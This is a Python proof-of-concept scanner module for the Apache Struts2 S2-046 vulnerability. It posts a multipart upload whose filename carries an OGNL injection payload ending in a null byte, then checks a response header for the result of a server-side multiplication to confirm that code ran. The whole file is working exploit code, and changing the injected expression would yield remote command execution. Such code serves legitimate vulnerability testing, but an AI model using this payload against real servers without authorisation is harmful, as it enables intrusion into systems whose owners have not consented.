#!/usr/bin/env python
# coding=utf-8
import requests
from report.report import save

pocname = "struts2-046"
#headers = {'Content-Type': 'multipart/form-data; boundary=5d87abbecb0b980ae6d8ee06e8ef7d7bf7f187bc56ed99c81ee5ac05e490','User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

def verify(arg, **kwargs):
	exploit = "upload type,the same as st2-045"          

	boundary="---------------------------735323031399963166993862150"
	paylaod="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',40765*42539)}\x00b"
	headers = {'Content-Type': 'multipart/form-data; boundary='+boundary+''}
	data ="--"+boundary+"\r\nContent-Disposition: form-data; name=\"foo\"; filename=\""+paylaod+"\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--"+boundary+"--"

	try:
		r = requests.post(url=arg,headers=headers,data=data)
		if "1734102335" in r.headers['x-res']:
			save(arg,pocname,exploit)
			return {"url": arg, "poc-name":pocname, "exploit": exploit}
	except Exception as e:
		pass
